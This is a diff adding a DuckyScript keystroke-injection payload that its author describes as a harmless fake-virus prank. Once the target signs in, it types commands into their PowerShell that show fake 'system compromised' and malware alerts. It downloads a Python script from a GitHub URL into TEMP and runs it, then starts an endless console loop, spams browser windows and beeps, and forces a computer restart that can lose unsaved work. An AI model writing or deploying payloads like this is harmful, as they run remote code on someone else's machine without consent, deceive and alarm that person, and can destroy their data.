@@ -1,0 +1,151 @@
+REM I made this script to simulate a fake virus prank (harmless). The entire sequence takes around 20 seconds. 
+DEFAULT_DELAY 200
+
+REM wait for the user to sign in
+DELAY 10000
+
+REM open powershell terminal
+GUI r 
+DELAY 500
+
+STRING powershell
+ENTER 
+DELAY 1000
+
+REM enter scary terminal text 
+STRING Write-Host "CRITICAL ERROR. Repairing ..." -ForegroundColor Red
+ENTER 
+DELAY 100
+
+REM GUI r 
+REM DELAY 300
+REM STRING powershell
+REM ENTER
+REM DELAY 500
+
+REM REM download python INSPECTOR!!!!!curl
+
+STRING [console]::Beep(1000, 500)  # 1000 Hz beep for half a second
+ENTER
+
+STRING Write-Host "System files corrupted. Repair failed." -ForegroundColor Red
+ENTER
+DELAY 100
+
+STRING Write-Host "Malware.Win32.Generic has been detected." -ForegroundColor Yellow
+ENTER
+DELAY 100
+
+STRING [console]::Beep(1000, 500)  # 1000 Hz beep for half a second
+ENTER
+
+STRING Write-Host "SYSTEM COMPROMISED" -ForegroundColor White -BackgroundColor DarkRed
+ENTER
+DELAY 100
+
+STRING Write-Host "Initiating lockdown..." -ForegroundColor DarkRed
+ENTER
+DELAY 100
+
+STRING [console]::Beep(1000, 500)  # 1000 Hz beep for half a second
+ENTER
+
+STRING  curl https://raw.githubusercontent.com/AayanShaikh007/inspector-prank/main/inspector.py -o "$env:TEMP\duck.py"
+ENTER
+DELAY 1000
+STRING python $env:TEMP\duck.py
+ENTER
+
+DELAY 4000
+STRING [char]1007, [char]1007, [char]1007, [char]1007, [char]1007, [char]1007, [char]1007,  [char]1007, [char]1007, [char]1007, [char]1007, [char]1007, [char]1007, [char]1007, [char]1007, [char]1007, [char]1007, [char]1007, [char]1007, [char]1007, [char]1007,  [char]1007, [char]1007, [char]1007, [char]1007, [char]1007, [char]1007, [char]1007
+ENTER
+
+REM Terminal garbled rain
+DELAY 1000
+STRING for (;;) { $s="";1..60 | %{$s+=[char](33+(Get-Random -Max 30))}; Write-Host $s -ForegroundColor Green; Start-Sleep -Milliseconds 40 }
+ENTER
+
+STRING [console]::Beep(1000, 500)  # 1000 Hz beep for half a second
+ENTER
+
+DELAY 7000
+
+REM Spam open edge (default delay of 200 should add to the virus effect)
+
+GUI r 
+STRING msedge
+ENTER
+
+GUI r 
+STRING msedge
+ENTER
+
+GUI r 
+STRING msedge
+ENTER
+
+STRING [console]::Beep(1000, 500)  # 1000 Hz beep for half a second
+ENTER
+
+GUI r 
+STRING msedge
+ENTER
+
+GUI r 
+STRING msedge
+ENTER
+
+GUI r 
+STRING msedge
+ENTER
+
+GUI r 
+STRING msedge
+ENTER
+
+GUI r 
+STRING msedge
+ENTER
+
+GUI r 
+STRING msedge
+ENTER
+
+GUI r 
+STRING msedge
+ENTER
+
+REM finale, make a annoying sound for 10 seconds, then end. makes multiple instances of this sound to make it harder to stop.
+GUI r
+STRING powershell
+ENTER
+DELAY 500
+STRING [console]::Beep(5000, 1000)
+ENTER
+
+GUI r
+STRING powershell
+ENTER
+DELAY 500
+STRING [console]::Beep(5000, 1000)
+ENTER
+
+
+GUI r
+STRING powershell
+ENTER
+DELAY 500
+STRING [console]::Beep(5000, 1000)
+ENTER
+
+
+GUI r
+STRING powershell
+ENTER
+DELAY 500
+STRING [console]::Beep(5000, 1000)
+ENTER
+
+REM finally, restart the users computer to close all opened applications.
+STRING Restart-Computer
+ENTER
